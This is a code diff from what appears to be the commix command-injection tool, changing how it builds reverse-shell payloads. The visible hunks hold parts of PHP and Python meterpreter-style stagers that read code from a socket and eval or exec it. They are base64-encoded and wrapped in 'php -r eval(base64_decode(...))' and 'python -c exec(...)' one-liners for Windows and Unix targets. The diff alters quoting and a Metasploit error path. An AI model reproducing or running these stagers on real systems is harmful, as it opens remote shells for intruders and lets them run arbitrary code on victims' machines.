@@ -182,9 +182,9 @@ $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len)
 case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
-        other_shell = settings.WIN_PHP_DIR + " -r \"eval(base64_decode(" +other_shell+ "));\""
+        other_shell = settings.WIN_PHP_DIR + " -r eval(base64_decode(" + other_shell + "));"
       else:
-        other_shell = "php -r \"eval(base64_decode(" +other_shell+ "));\""
+        other_shell = "php -r \"eval(base64_decode(" + other_shell + "));\""
       break
 
     # Python-reverse-shell (meterpreter)
@@ -199,9 +199,9 @@ while len(d)!=l:
 exec(d,{'s':s})"""      
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
-        other_shell = settings.WIN_PYTHON_DIR + " -c \"exec('" +other_shell+ "'.decode('base64'))\""
+        other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + other_shell + "'.decode('base64'))"
       else:
-        other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
+        other_shell = "python -c \"exec('" + other_shell + "'.decode('base64'))\""
       break
 
     elif other_shell == '7':
@@ -242,7 +242,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             else:
               error_msg = "You need to have Metasploit installed. Please ensure Metasploit is installed in the right path."
               print settings.print_error_msg(error_msg)
-              continue  
+              break
       break
     elif other_shell.lower() == "reverse_tcp":
       warn_msg = "You are already into the 'reverse_tcp' mode."
